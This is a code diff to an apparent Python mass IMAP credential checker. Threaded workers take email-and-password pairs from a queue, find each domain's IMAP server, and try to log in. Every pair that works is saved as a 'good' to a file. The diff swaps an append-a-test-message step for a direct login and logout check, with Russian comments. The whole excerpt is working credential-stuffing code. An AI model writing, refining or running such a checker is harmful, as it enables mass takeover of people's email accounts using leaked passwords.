@@ -390,40 +390,48 @@ def imap_connect_and_send(imap_server, port, login_template, imap_user, password
         raise Exception(f"IMAP connection/authentication failed: {str(e)}")
 
 def worker_item(jobs_que, results_que):
-	global min_threads, threads_counter, verify_email, goods, imap_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
-	while True:
-		if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
-			break
-		if jobs_que.empty():
-			if no_jobs_left:
-				break
-			else:
-				results_que.put('queue exhausted, '+bold('sleeping...'))
-				time.sleep(1)
-				continue
-		else:
-			time_start = time.perf_counter()
-			imap_server, port, imap_user, password = jobs_que.get()
-			login_template = default_login_template
-			try:
-				results_que.put(f'getting settings for {imap_user}:{password}')
-				if not imap_server or not port:
-					imap_server_port_arr, login_template = get_imap_config(imap_user.split('@')[1])
-					if len(imap_server_port_arr):
-						imap_server, port = random.choice(imap_server_port_arr).split(':')
-					else:
-						raise Exception('still no connection details for '+imap_user)
-				results_que.put(blue('connecting to')+f' {imap_server}|{port}|{imap_user}|{password}')
-				imap_connect_and_append(imap_server, port, login_template, imap_user, password, 'INBOX', verify_email)
-				results_que.put(green(imap_user+':\a'+password, 7)+(verify_email and green(' sent to '+verify_email, 7)))
-				open(imap_filename, 'a').write(f'{imap_server}|{port}|{imap_user}|{password}\n')
-				goods += 1
-			except Exception as e:
-				results_que.put(orange((imap_server and port and imap_server+':'+port+' - ' or '')+', '.join(str(e).splitlines()).strip()))
-			time.sleep(0.04)  # unlock other threads a bit
-			loop_times.append(time.perf_counter() - time_start)
-			loop_times.pop(0) if len(loop_times) > min_threads else 0
-	threads_counter -= 1
+    global min_threads, threads_counter, verify_email, goods, imap_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
+    while True:
+        if (mem_usage > 90 or cpu_usage > 90) and threads_counter > min_threads:
+            break
+        if jobs_que.empty():
+            if no_jobs_left:
+                break
+            else:
+                results_que.put('queue exhausted, ' + bold('sleeping...'))
+                time.sleep(1)
+                continue
+        else:
+            time_start = time.perf_counter()
+            imap_server, port, imap_user, password = jobs_que.get()
+            login_template = default_login_template
+            try:
+                results_que.put(f'getting settings for {imap_user}:{password}')
+                if not imap_server or not port:
+                    imap_server_port_arr, login_template = get_imap_config(imap_user.split('@')[1])
+                    if len(imap_server_port_arr):
+                        imap_server, port = random.choice(imap_server_port_arr).split(':')
+                    else:
+                        raise Exception('still no connection details for ' + imap_user)
+                results_que.put(blue('connecting to') + f' {imap_server}|{port}|{imap_user}|{password}')
+                
+                # Проверка подключения по IMAP
+                if port == '993':
+                    conn = imaplib.IMAP4_SSL(imap_server, int(port))
+                else:
+                    conn = imaplib.IMAP4(imap_server, int(port))
+                conn.login(imap_user, password)  # Попытка входа
+                conn.logout()  # Закрытие соединения
+                
+                results_que.put(green(imap_user + ':\a' + password, 7))
+                open(imap_filename, 'a').write(f'{imap_server}|{port}|{imap_user}|{password}\n')
+                goods += 1
+            except Exception as e:
+                results_que.put(orange((imap_server and port and imap_server + ':' + port + ' - ' or '') + ', '.join(str(e).splitlines()).strip()))
+            time.sleep(0.04)  # unlock other threads a bit
+            loop_times.append(time.perf_counter() - time_start)
+            loop_times.pop(0) if len(loop_times) > min_threads else 0
+    threads_counter -= 1
 
 def every_second():
 	global progress, speed, mem_usage, cpu_usage, net_usage, jobs_que, results_que, threads_counter, min_threads, loop_times, loop_time, no_jobs_left
